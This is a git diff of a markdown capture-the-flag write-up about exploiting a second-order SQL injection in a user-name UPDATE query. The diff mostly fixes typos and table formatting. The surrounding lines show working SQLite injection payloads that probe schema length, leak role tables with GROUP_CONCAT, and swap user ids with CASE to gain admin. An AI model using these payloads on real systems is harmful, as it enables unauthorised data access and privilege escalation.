@@ -10,8 +10,9 @@ comments: true
 ---
 
 ## Description:
-
 This was pretty cool challenge. It was easy to determine that the site is vulnerable to SQLi. But the difficult part was exploiting it to become admin.
+
+
 
 ## Enumeration:
 
@@ -30,15 +31,15 @@ Query at backend should look something like:
 UPDATE users
 SET     name = "(User Input)"
 WHERE id = 1
-
 ```
+
 
 Payload to check the length of the table SCHEMA. The payload is checking if the second or condition is true or not. ( "" OR 1=1 -- ) should return in 1 as first condition is False as we keeing name empty and 1=1 is True, this will assign the username as 1. ( "" OR 1=0 -- ) But if the second condition is False then the username will become 0. I found its length to be 119.
 ```
 " OR (SELECT LENGTH(sql) FROM sqlite_master WHERE type="table" AND name="roles_843b46a14818cf3e") > 119 --
 ```
 
-Now to leak the SCHEMA, for some reason SQLMap wasnt workinf well with second order injection and I had to write write the following script to bruteforce.
+Now to leak the SCHEMA, for some reason SQLMap wasnt working well with second order injection and I had to write write the following script to bruteforce.
 
 ```python
 import requests, string
@@ -77,15 +78,17 @@ You can use something like following to easily leak the tables.
 ", name=(SELECT GROUP_CONCAT(admin,"|") from roles_57fd80a6ac365e90 WHERE id = 0 ) WHERE id=1 --
 ```
 
-Users                           Role
------------------               -----------------           
+
+User                             Role
+        
 | id    | name  |               | id    | admin |
------------------               -----------------
+|:------|:------|               |:------|:------|
 |   0   | admin |               |   0   |   1   |
 |   1   | input |               |   1   |   0   |
------------------               -----------------
 
-Our user id will always remain 1 so only way to become admin is to make admins user id 1.
+
+Our user id will always remain 1 so only way to become admin is to make admin's user id 1.
+
 
 
 ## Exploitation
@@ -99,5 +102,5 @@ Our user id will always remain 1 so only way to become admin is to make admins u
     ", id =  CASE WHEN id=1 THEN 4 WHEN id=3 THEN 1 END  WHERE id IN (1,3,4)  --
 ```
 
-![Branching](2.jpg)
+    ![Branching](2.jpg)
 
